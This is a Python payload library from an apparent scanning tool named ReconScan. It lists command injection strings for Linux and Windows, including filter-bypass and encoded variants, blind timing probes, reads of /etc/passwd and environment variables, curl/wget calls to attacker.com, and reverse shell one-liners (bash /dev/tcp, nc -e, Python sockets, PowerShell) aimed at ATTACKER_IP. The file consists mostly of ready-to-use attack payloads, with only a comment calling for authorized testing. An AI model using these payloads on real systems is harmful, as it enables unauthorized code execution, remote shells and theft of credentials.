"""
ReconScan Command Injection Payload Library

Comprehensive command injection testing payloads from exploit databases.
Organized by operating system and injection technique.
"""

class CommandInjectionPayloads:
    """Comprehensive command injection payload collection for vulnerability testing."""
    
    def __init__(self):
        """Initialize command injection payload sets."""
        
        # Basic command injection payloads
        self.basic_payloads = [
            "; id",
            "| id",
            "&& id",
            "|| id",
            "; whoami",
            "| whoami",
            "&& whoami",
            "|| whoami",
            "; ls",
            "| ls",
            "&& ls",
            "|| ls"
        ]
        
        # Linux-specific payloads
        self.linux_payloads = [
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "&& cat /etc/passwd",
            "|| cat /etc/passwd",
            "; uname -a",
            "| uname -a",
            "&& uname -a",
            "|| uname -a",
            "; ps aux",
            "| ps aux",
            "&& ps aux",
            "|| ps aux",
            "; netstat -an",
            "| netstat -an",
            "&& netstat -an",
            "|| netstat -an",
            "; env",
            "| env",
            "&& env",
            "|| env"
        ]
        
        # Windows-specific payloads
        self.windows_payloads = [
            "; dir",
            "| dir",
            "&& dir",
            "|| dir",
            "; type C:\\boot.ini",
            "| type C:\\boot.ini",
            "&& type C:\\boot.ini",
            "|| type C:\\boot.ini",
            "; systeminfo",
            "| systeminfo",
            "&& systeminfo",
            "|| systeminfo",
            "; net user",
            "| net user",
            "&& net user",
            "|| net user",
            "; ipconfig",
            "| ipconfig",
            "&& ipconfig",
            "|| ipconfig"
        ]
        
        # Time-based payloads (for blind command injection)
        self.time_based_payloads = [
            "; sleep 5",
            "| sleep 5",
            "&& sleep 5",
            "|| sleep 5",
            "; ping -c 5 127.0.0.1",
            "| ping -c 5 127.0.0.1",
            "&& ping -c 5 127.0.0.1",
            "|| ping -c 5 127.0.0.1",
            "; timeout 5",
            "| timeout 5",
            "&& timeout 5",
            "|| timeout 5",
            "; ping -n 5 127.0.0.1",
            "| ping -n 5 127.0.0.1",
            "&& ping -n 5 127.0.0.1",
            "|| ping -n 5 127.0.0.1"
        ]
        
        # Output-based payloads
        self.output_payloads = [
            "; echo 'command_injection_test'",
            "| echo 'command_injection_test'",
            "&& echo 'command_injection_test'",
            "|| echo 'command_injection_test'",
            "; echo command_injection_test",
            "| echo command_injection_test",
            "&& echo command_injection_test",
            "|| echo command_injection_test",
            "; printf 'cmd_injection'",
            "| printf 'cmd_injection'",
            "&& printf 'cmd_injection'",
            "|| printf 'cmd_injection'"
        ]
        
        # Encoded payloads (to bypass filters)
        self.encoded_payloads = [
            "%3B%20id",
            "%7C%20id",
            "%26%26%20id",
            "%7C%7C%20id",
            "$(id)",
            "`id`",
            "${id}",
            "$(whoami)",
            "`whoami`",
            "${whoami}",
            "%24%28id%29",
            "%60id%60"
        ]
        
        # Advanced bypass payloads
        self.bypass_payloads = [
            "';id;'",
            "\";id;\"",
            "';whoami;'",
            "\";whoami;\"",
            "1;id",
            "1|id",
            "1&&id",
            "1||id",
            "test;id",
            "test|id",
            "test&&id",
            "test||id",
            "$IFS$9id",
            "${IFS}id",
            "$()id",
            "`id`",
            "$(id)",
            "{id,}",
            "i\\d",
            "i'd'",
            "'i'd'"
        ]
        
        # Reverse shell payloads (dangerous - use only in authorized testing)
        self.reverse_shell_payloads = [
            "; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
            "| bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
            "&& bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
            "|| bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
            "; nc -e /bin/sh ATTACKER_IP 4444",
            "| nc -e /bin/sh ATTACKER_IP 4444",
            "&& nc -e /bin/sh ATTACKER_IP 4444",
            "|| nc -e /bin/sh ATTACKER_IP 4444",
            "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "; powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"ATTACKER_IP\",4444);"
        ]
        
        # File operation payloads
        self.file_operation_payloads = [
            "; touch /tmp/cmd_injection_test",
            "| touch /tmp/cmd_injection_test",
            "&& touch /tmp/cmd_injection_test",
            "|| touch /tmp/cmd_injection_test",
            "; echo test > /tmp/cmd_test.txt",
            "| echo test > /tmp/cmd_test.txt",
            "&& echo test > /tmp/cmd_test.txt",
            "|| echo test > /tmp/cmd_test.txt",
            "; curl http://attacker.com/test",
            "| curl http://attacker.com/test",
            "&& curl http://attacker.com/test",
            "|| curl http://attacker.com/test",
            "; wget http://attacker.com/test",
            "| wget http://attacker.com/test",
            "&& wget http://attacker.com/test",
            "|| wget http://attacker.com/test"
        ]
        
        # Success indicators for command injection
        self.success_indicators = [
            'uid=',                    # id command output
            'gid=',                    # id command output
            'root:x:0:0:',            # /etc/passwd content
            'PING',                   # ping command output
            'command_injection_test', # echo test string
            'cmd_injection',          # printf test string
            'total 0',                # ls output
            'Volume in drive',        # Windows dir output
            'Directory of',           # Windows dir output
            'Microsoft Windows',      # Windows systeminfo
            'Linux',                  # uname output
            'GNU/Linux',              # uname output
            '127.0.0.1',             # ping output
            'bytes from'             # ping output
        ]
        
    def get_basic_payloads(self):
        """Get basic command injection payloads."""
        return self.basic_payloads
    
    def get_linux_payloads(self):
        """Get Linux-specific command injection payloads."""
        return self.linux_payloads
    
    def get_windows_payloads(self):
        """Get Windows-specific command injection payloads."""
        return self.windows_payloads
    
    def get_time_based_payloads(self):
        """Get time-based command injection payloads."""
        return self.time_based_payloads
    
    def get_output_payloads(self):
        """Get output-based command injection payloads."""
        return self.output_payloads
    
    def get_encoded_payloads(self):
        """Get encoded command injection payloads."""
        return self.encoded_payloads
    
    def get_bypass_payloads(self):
        """Get filter bypass command injection payloads."""
        return self.bypass_payloads
    
    def get_reverse_shell_payloads(self, attacker_ip="127.0.0.1"):
        """Get reverse shell payloads (replace ATTACKER_IP)."""
        return [payload.replace("ATTACKER_IP", attacker_ip) for payload in self.reverse_shell_payloads]
    
    def get_file_operation_payloads(self):
        """Get file operation command injection payloads."""
        return self.file_operation_payloads
    
    def get_success_indicators(self):
        """Get indicators of successful command injection."""
        return self.success_indicators
    
    def get_all_payloads(self):
        """Get comprehensive list of all command injection payloads."""
        all_payloads = []
        all_payloads.extend(self.basic_payloads)
        all_payloads.extend(self.linux_payloads)
        all_payloads.extend(self.windows_payloads)
        all_payloads.extend(self.time_based_payloads)
        all_payloads.extend(self.output_payloads)
        all_payloads.extend(self.encoded_payloads)
        all_payloads.extend(self.bypass_payloads)
        all_payloads.extend(self.file_operation_payloads)
        # Note: Excluding reverse shell payloads from default list for safety
        
        return list(set(all_payloads))  # Remove duplicates
    
    def get_targeted_payloads(self, severity='medium', os_type='linux'):
        """Get payloads based on severity/depth of testing."""
        if severity == 'low':
            return self.basic_payloads[:5]
        elif severity == 'medium':
            payloads = []
            payloads.extend(self.basic_payloads)
            payloads.extend(self.output_payloads[:5])
            if os_type.lower() == 'windows':
                payloads.extend(self.windows_payloads[:5])
            else:
                payloads.extend(self.linux_payloads[:5])
            return payloads
        elif severity == 'high':
            return self.get_all_payloads()
        else:
            return self.basic_payloads
    
    @staticmethod
    def get_common_parameters():
        """Get common parameter names for command injection testing."""
        return [
            'cmd', 'command', 'exec', 'execute', 'run', 'system', 'shell',
            'ping', 'host', 'ip', 'addr', 'domain', 'url', 'path', 'file',
            'filename', 'script', 'program', 'proc', 'process', 'tool',
            'utility', 'binary', 'exe', 'bat', 'sh', 'bash', 'powershell',
            'ps', 'terminal', 'console', 'cli', 'input', 'param', 'arg'
        ] 